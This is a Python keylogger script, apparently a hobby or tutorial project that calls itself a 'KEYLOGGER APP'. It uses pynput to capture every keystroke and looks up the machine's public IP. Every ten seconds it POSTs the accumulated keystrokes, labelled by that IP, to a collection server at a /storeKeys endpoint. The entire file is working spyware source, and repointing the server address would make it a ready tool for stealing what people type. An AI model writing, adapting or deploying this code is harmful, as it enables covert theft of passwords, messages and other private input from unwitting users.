from pynput import keyboard
from pynput.keyboard import Key, Listener
import requests
# To transform a Dictionary to a JSON string we need the json package.
import json
#  The Timer module is part of the threading package.
import threading


text = ''


localhost = "127.0.0.1"
port_number = "4000"
# Time interval in seconds for code to execute.
time_interval = 10


def get_ip_address():
    url = 'https://api.ipify.org'
    response = requests.get(url)
    ip_address = response.text
    return ip_address


def send_post_req():
    global text
    try:
        ip_address = get_ip_address()
        print("Computer IP Address is:" + (ip_address))
        # We need to convert the Python object into a JSON string. So that we can POST it to the server. Which will look for JSON using
        # the format {"ip_address" : "<value_of_text>"}
        # Replacing dot with hyphen to avoid firebase error
        ip_address = ip_address.replace(".", "-")
        data = {ip_address: text}
        payload = json.dumps(data)
        # We send the POST Request to the server with ip address which listens on the port as specified in the Express server code.
        # Because we're sending JSON to the server, we specify that the MIME Type for JSON is application/json.
        r = requests.post(f"http://{localhost}:{port_number}/storeKeys",
                          data=payload, headers={"Content-Type": "application/json"})
        # Setting up a timer function to run every <time_interval> specified seconds. send_post_req is a recursive function, and will call itself as long as the program is running.
        timer = threading.Timer(time_interval, send_post_req)
        # We start the timer thread.
        timer.start()
    except:
        print("Couldn't complete request!")


def on_press(key):
    global text
    # Based on the key press we handle the way the key gets logged to the in memory string.
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.shift_r:
        pass
    elif key == keyboard.Key.cmd:
        pass
    elif key == keyboard.Key.cmd_r:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
        text += str(key).strip("'")


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    print("!!! WELCOME TO KEYLOGGER APP !!!")
    print("!!! APP IS READY TO LISTEN THE KEYS !!!")
    send_post_req()
    listener.join()
